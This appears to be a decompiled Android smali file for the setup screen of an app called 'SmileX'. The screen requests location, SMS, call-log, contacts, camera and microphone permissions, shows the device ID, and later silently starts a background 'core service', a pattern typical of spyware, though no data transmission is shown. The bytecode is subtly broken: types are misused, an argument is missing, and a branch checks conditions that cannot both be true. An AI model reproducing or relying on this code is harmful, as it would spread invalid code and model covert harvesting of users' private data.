.class public Lcom/smilex/enhanced/activities/SetupWizardActivity;
.super Landroid/app/Activity;
.source "SetupWizardActivity.java"

# static fields
.field private static final PREFS_NAME:Ljava/lang/String; = "smilex_setup"
.field private static final KEY_SETUP_DONE:Ljava/lang/String; = "setup_completed"

# instance fields
.field private mCurrentStep:I
.field private mTotalSteps:I

# direct methods
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method private isSetupCompleted()Z
    .locals 2
    const-string v0, "smilex_setup"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    const-string v1, "setup_completed"
    invoke-interface {v0, v1, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v0
    return v0
.end method

.method private markSetupCompleted()V
    .locals 2
    const-string v0, "smilex_setup"
    const/4 v1, 0x0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v0
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
    move-result-object v0
    const-string v1, "setup_completed"
    invoke-interface {v0, v1}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V
    return-void
.end method

.method private requestRuntimePermissions()V
    .locals 3
    const/4 v0, 0x6
    new-array v0, v0, [Ljava/lang/String;
    const/4 v1, 0x0
    const-string v2, "android.permission.ACCESS_FINE_LOCATION"
    aput-object v2, v0, v1
    const/4 v1, 0x1
    const-string v2, "android.permission.READ_SMS"
    aput-object v2, v0, v1
    const/4 v1, 0x2
    const-string v2, "android.permission.READ_CALL_LOG"
    aput-object v2, v0, v1
    const/4 v1, 0x3
    const-string v2, "android.permission.READ_CONTACTS"
    aput-object v2, v0, v1
    const/4 v1, 0x4
    const-string v2, "android.permission.CAMERA"
    aput-object v2, v0, v1
    const/4 v1, 0x5
    const-string v2, "android.permission.RECORD_AUDIO"
    aput-object v2, v0, v1
    invoke-static {v0}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;
    move-result-object v0
    invoke-virtual {p0, v0}, Landroid/app/Activity;->requestPermissions(Ljava/util/List;)V
    return-void
.end method

.method private showStep(I)V
    .locals 4
    iput p1, p0, Lcom/smilex/enhanced/activities/SetupWizardActivity;->mCurrentStep:I
    new-instance v0, Landroid/widget/LinearLayout;
    const/4 v1, 0x1
    invoke-direct {v0, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->setOrientation(I)V
    const/4 v1, 0x3
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;
    const/4 v3, -0x1
    invoke-direct {v2, v3, v3}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V
    const/16 v3, 0x1e
    invoke-virtual {v2, v3, v3, v3, v3}, Landroid/widget/LinearLayout$LayoutParams;->setMargins(IIII)V
    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V
    new-instance v2, Landroid/widget/TextView;
    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V
    const/high16 v3, -0x1000000
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V
    const/high16 v3, 0x41800000
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextSize(F)V
    invoke-interface {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
    move-result-object p1
    const-string v3, "android_id"
    invoke-static {p1, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
    move-result-object p1
    const-string v3, "Device ID: "
    invoke-virtual {v3}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v3, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object p1
    invoke-virtual {v2, p1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    invoke-virtual {v0, v2}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
    return-void
.end method

# virtual methods
.method public onActivityResult(IILandroid/content/Intent;)V
    .locals 2
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V
    iget v0, p0, Lcom/smilex/enhanced/activities/SetupWizardActivity;->mCurrentStep:I
    const/4 v1, 0x2
    if-ne v0, v1, :cond_0
    iget v0, p0, Lcom/smilex/enhanced/activities/SetupWizardActivity;->mCurrentStep:I
    const/4 v1, 0x3
    if-ne v0, v1, :cond_0
    const/4 v0, 0x4
    invoke-direct {p0, v0}, Lcom/smilex/enhanced/activities/SetupWizardActivity;->showStep(I)V
    :cond_0
    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 2
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    const/4 v0, 0x4
    invoke-direct {p0, v0}, Lcom/smilex/enhanced/activities/SetupWizardActivity;->showStep(I)V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    invoke-direct {p0}, Lcom/smilex/enhanced/activities/SetupWizardActivity;->isSetupCompleted()Z
    move-result v0
    if-eqz v0, :cond_0
    invoke-static {p0}, Lcom/smilex/enhanced/utils/ServiceLauncher;->startCoreService(Landroid/content/Context;)V
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :cond_0
    const-string v0, "SmileX Setup"
    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V
    const/4 v0, 0x1
    invoke-direct {p0, v0}, Lcom/smilex/enhanced/activities/SetupWizardActivity;->showStep(I)V
    return-void
.end method
